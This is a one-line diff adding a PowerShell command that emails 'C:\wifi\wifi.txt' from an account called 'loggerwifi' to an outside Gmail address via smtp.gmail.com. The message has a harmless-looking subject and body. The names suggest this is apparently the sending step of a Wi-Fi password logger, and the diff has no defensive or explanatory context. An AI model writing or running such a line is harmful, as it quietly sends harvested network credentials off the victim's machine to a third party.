@@ -1,0 +1,1 @@
+Send-MailMessage -From 'loggerwifi <loggerwifi@gmail.com>' -To 'dvdvirant <dvdvirant@gmail.com>' -Subject 'Sending the Attachment' -Body "Forgot to send the attachment. Sending now." -Attachments '"C:\wifi\wifi.txt"' -Priority High -DeliveryNotificationOption OnSuccess, OnFailure -SmtpServer 'smtp.gmail.com'
